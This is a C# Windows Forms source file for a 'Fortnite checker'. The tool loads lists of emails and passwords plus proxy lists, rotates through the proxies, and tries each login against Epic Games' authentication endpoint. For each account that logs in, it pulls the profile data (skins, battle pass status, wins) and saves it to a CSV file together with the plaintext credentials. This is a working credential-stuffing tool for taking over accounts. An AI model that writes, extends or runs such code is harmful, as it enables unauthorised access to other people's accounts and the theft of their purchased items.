using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using CsvHelper;
using FortniteChecker.Classes;
using FortniteChecker.Models;
using FortniteChecker.Models.FortniteAPI;
using Newtonsoft.Json;

namespace FortniteChecker.Forms
{
    public partial class Main : Form
    {
        private List<Proxy> _proxies;
        private List<FortniteAccount> _accounts;
        private string _resultsDirectory;

        private int _totalChecked;
        private int _totalValid;
        private int _totalInvalid;

        private TextWriter _textWriter;
        private CsvWriter _csvWriter;

        private CancellationTokenSource _cts;
        private CancellationToken _token;

        public Main()
        {
            InitializeComponent();

            _proxies = new List<Proxy>();
            _accounts = new List<FortniteAccount>();

        }

        private void btnLoadProxies_Click(object sender, System.EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Multiselect = true;
                ofd.CheckFileExists = true;
                ofd.RestoreDirectory = true;
                ofd.InitialDirectory = Environment.SpecialFolder.Desktop.ToString();
                ofd.Filter = @"Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                ofd.Title = @"Load proxy lists";

                // NOTE: User didn't select any files
                if (ofd.ShowDialog() != DialogResult.OK) return;

                // NOTE: This will clear all previously loaded proxies and load new ones
                _proxies.Clear();
                _proxies = ProxyHelper.ValidateAndLoadProxies(ofd.FileNames);

                lblProxies.Text = $@"{lblProxies.Tag} ({_proxies.Count})";
            }
        }

        private void btnLoadAccounts_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Multiselect = true;
                ofd.CheckFileExists = true;
                ofd.RestoreDirectory = true;
                ofd.InitialDirectory = Environment.SpecialFolder.Desktop.ToString();
                ofd.Filter = @"Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                ofd.Title = @"Load accounts lists";

                // NOTE: User didn't select any files
                if (ofd.ShowDialog() != DialogResult.OK) return;

                // NOTE: This will clear all previously loaded accounts and load new ones
                _accounts.Clear();
                _accounts = AccountsHelper.ValidateAndLoadAccounts(ofd.FileNames);

                lblAccounts.Text = $@"{lblAccounts.Tag} ({_accounts.Count})";
            }
        }

        private void btnLoadResultsDirectory_Click(object sender, EventArgs e)
        {
            using (var fbd = new FolderBrowserDialog())
            {
                fbd.Description = @"Results directory";
                fbd.RootFolder = Environment.SpecialFolder.Desktop;
                fbd.ShowNewFolderButton = true;

                // NOTE: User didn't select any folder
                if (fbd.ShowDialog() != DialogResult.OK) return;
                
                txtResultsDirectory.Text = fbd.SelectedPath;
                _resultsDirectory = fbd.SelectedPath;
            }
        }

        private void UpdateStatus(int totalChecked, int totalValid, int totalInvalid)
        {
            Invoke(new MethodInvoker(() =>
            {
                lblChecked.Text = totalChecked + @"/" + _accounts.Count;
                lblValid.Text = totalValid.ToString();
                lblInvalid.Text = totalInvalid.ToString();
                progressBarStatus.Value = (_totalChecked * 100) / _accounts.Count;
            }));
        }

        // NOTE: This will disable start button while running and enable stop and vice-versa
        private void ButtonStatus(bool running)
        {
            if (running)
            {
                btnStart.Enabled = false;
                btnStop.Enabled = true;
            }
            else
            {
                btnStart.Enabled = true;
                btnStop.Enabled = false;
            }
        }

        private async void btnStart_Click(object sender, EventArgs e)
        {
            // NOTE: Won't start if no save directory is selected
            if (string.IsNullOrEmpty(txtResultsDirectory.Text)) return;

            // No proxies to use
            if (cbUseProxies.Checked && _proxies.Count <= 0) return;
            
            ButtonStatus(true);

            // Generate new token for cancellation
            _cts = new CancellationTokenSource();
            _token = _cts.Token;

            _totalChecked = 0;
            _totalValid = 0;
            _totalInvalid = 0;

            UpdateStatus(_totalChecked, _totalValid, _totalInvalid);
            
            var proxyIndex = 0;

            var saveFile = _resultsDirectory + $@"\{DateTime.Now:dd.MM_hh.mm.ss}.csv";

            // NOTE: Will append existing files.
            _textWriter = new StreamWriter(saveFile, true, Encoding.UTF8);

            _csvWriter = new CsvWriter(_textWriter);
            _csvWriter.Configuration.QuoteAllFields = true;
            _csvWriter.Configuration.Delimiter = ",";

            _csvWriter.WriteHeader<FortniteAccountFullData>();
            await _csvWriter.NextRecordAsync();

            foreach (var account in _accounts)
            {
                if (_token.IsCancellationRequested)
                {
                    ButtonStatus(false);

                    return;
                }

                IWebProxy proxy = null;
                if (cbUseProxies.Checked)
                {
                    if (proxyIndex >= _proxies.Count)
                    {
                        // NOTE: Reached last proxy, either restart index to 0 or return
                        proxyIndex = 0;
                        //return;
                    }

                    // NOTE: Will use each proxy only once for one check
                    proxy = ProxyHelper.GetWebProxy(_proxies[proxyIndex]);

                    proxyIndex++;
                }

                var checkAccount = await CheckAccount(account, proxy);

                if (checkAccount)
                {
                    _totalValid++;
                }
                else
                {
                    _totalInvalid++;
                }

                _totalChecked++;

                UpdateStatus(_totalChecked, _totalValid, _totalInvalid);
            }

            _textWriter.Close();
            
            ButtonStatus(false);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            try
            {
                _cts.Cancel();

                btnStart.Enabled = true;
                btnStop.Enabled = false;
            }
            catch (Exception)
            {
                // NOTE: Failed cancelling token
            }
        }

        private async Task<bool> CheckAccount(FortniteAccount account, IWebProxy proxy)
        {
            using (var httpClientHandler = new HttpClientHandler())
            {
                httpClientHandler.CookieContainer = new CookieContainer();
                httpClientHandler.AllowAutoRedirect = false;
                
                if (proxy != null)
                {
                    httpClientHandler.UseDefaultCredentials = false;
                    httpClientHandler.PreAuthenticate = true;
                    httpClientHandler.UseProxy = true;
                    httpClientHandler.Proxy = proxy;
                }

                using (var httpClient = new HttpClient(httpClientHandler))
                {
                    httpClient.Timeout = TimeSpan.FromSeconds(10);
                    httpClient.DefaultRequestHeaders.Add("User-Agent", GlobalVariables.UserAgent);
                    httpClient.DefaultRequestHeaders.Add("Authorization", GlobalVariables.AuthorizationValue);
                    httpClient.DefaultRequestHeaders.ExpectContinue = true;
                    
                    var postData = new FormUrlEncodedContent(new Dictionary<string, string>
                    {
                        { "grant_type", "password" },
                        { "username", account.EmailAddress },
                        { "password", account.Password },
                        { "includePerms", "true" },
                        { "token_type", "eg1" }
                    });

                    HttpResponseMessage postRequest = null;
                    try
                    {
                        postRequest = await httpClient.PostAsync(GlobalVariables.LoginUrl, postData);
                    }
                    catch (HttpRequestException e)
                    {
                        Console.WriteLine($@"Error while sending request.");
                        Console.WriteLine($@"--------------------------------------------------------------");
                        Console.WriteLine($@"Error message: {e.Message}.");
                        Console.WriteLine($@"Inner exception: {e.InnerException?.Message}.");
                        Console.WriteLine($@"Inner inner exception: {e.InnerException?.InnerException?.Message}.");

                        // NOTE: Account might be valid, but failed to send request (could be proxy issue)
                        return false;
                    }

                    if (postRequest == null) return false;

                    var response = await postRequest.Content.ReadAsStringAsync();

                    if (!response.Contains("access_token"))
                    {
                        var errorResponse = JsonConvert.DeserializeObject<FortniteError>(response);

                        Console.WriteLine($@"An error occured while checking account {account.EmailAddress}.");
                        Console.WriteLine($@"--------------------------------------------------------------");
                        Console.WriteLine($@"Error: {errorResponse.Error} [code: {errorResponse.ErrorCode}] - Message: {errorResponse.ErrorMessage}.");

                        return false;
                    }

                    var successResponse = JsonConvert.DeserializeObject<FortniteSuccess>(response);

                    var accessToken = successResponse.AccessToken;
                    var accountId = successResponse.AccountId;

                    httpClient.DefaultRequestHeaders.Remove("Authorization");
                    httpClient.DefaultRequestHeaders.Add("Authorization", $@"bearer {accessToken}");

                    var jsonContent = new StringContent("{}", Encoding.UTF8, "application/json");

                    var getDataRequest = await httpClient.PostAsync(
                        $"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{accountId}/client/QueryProfile?profileId=athena&rvn=-1",
                        jsonContent);

                    // NOTE: If the request isn't successful, it's still valid, but the data won't be parsed (skins, wins etc)
                    if (!getDataRequest.IsSuccessStatusCode) return true;

                    var userDataResponse = await getDataRequest.Content.ReadAsStringAsync();

                    var userDataParsed = JsonConvert.DeserializeObject<FortniteProfileData>(userDataResponse);

                    await SaveProfileDataToCsv(userDataParsed, account);

                    return true;
                }
            }
        }

        private async Task SaveProfileDataToCsv(FortniteProfileData data, FortniteAccount account)
        {
            // NOTE: Just in case, to prevent crash
            if (data.ProfileChanges.Count <= 0) return;

            var accountId = data.ProfileChanges[0].Profile.AccountId;

            var items = data.ProfileChanges[0].Profile.Item;

            var outfits = SkinParser.GetOutfit(items);
            var backblings = SkinParser.GetBackBlings(items);
            var gliders = SkinParser.GetGliders(items);
            var pickaxes = SkinParser.GetPickaxes(items);

            var userProfileData = data.ProfileChanges[0].Profile;

            var createdAt = userProfileData.Created;
            var lastUpdated = userProfileData.Updated;
            var hasBattlePass = userProfileData.Stats.Attributes.BookPurchased;
            var currentPassTier = userProfileData.Stats.Attributes.BookLevel;
            var lifetimeWins = userProfileData.Stats.Attributes.LifetimeWins;
            var currentLevel = userProfileData.Stats.Attributes.Level;
            var accountLevel = userProfileData.Stats.Attributes.AccountLevel;

            var oldSeasons = new List<OldSeason>();
            foreach (var season in userProfileData.Stats.Attributes.PastSeasons)
            {
                oldSeasons.Add(new OldSeason
                {
                    SeasonNumber = season.SeasonNumber,
                    PurchasedBattlePass = season.PurchasedVip,
                    BattlePassLevel = season.BookLevel,
                    SeasonLevel = season.SeasonLevel,
                    SeasonWins = season.NumWins
                });
            }

            var fullProfile = new FortniteAccountFullData
            {
                AccountData = account,
                AccountId = accountId,
                CreatedAt = createdAt,
                LastUpdate = lastUpdated,
                HasBattlePassPurchased = hasBattlePass,
                CurrentBattlePassLevel = currentPassTier,
                LifetimeTotalWins = lifetimeWins,
                CurrentSeasonalLevel = currentLevel,
                AccountLevel = accountLevel,
                //PastSeasons = oldSeasons,
                Outfits = outfits,
                Backblings = backblings,
                Gliders = gliders,
                Pickaxes = pickaxes
            };
            
            _csvWriter.WriteRecord(fullProfile);

            // Write the fields for each previous season manually because CsvHelper doesn't support List<T>
            var seasonStats = new StringBuilder();
            foreach (var season in oldSeasons)
            {
                seasonStats.AppendLine("Season number: " + season.SeasonNumber);
                seasonStats.AppendLine("Season wins: " + season.SeasonWins);
                seasonStats.AppendLine("Season level: " + season.SeasonLevel);
                seasonStats.AppendLine("Season pass: " + season.PurchasedBattlePass);
                seasonStats.AppendLine("Season pass level: " + season.BattlePassLevel);

                _csvWriter.WriteField(seasonStats);

                seasonStats.Clear();
            }

            // Finish the row after writing the season data and go to next
            await _csvWriter.NextRecordAsync();

            _textWriter.Flush();
        }
    }
}

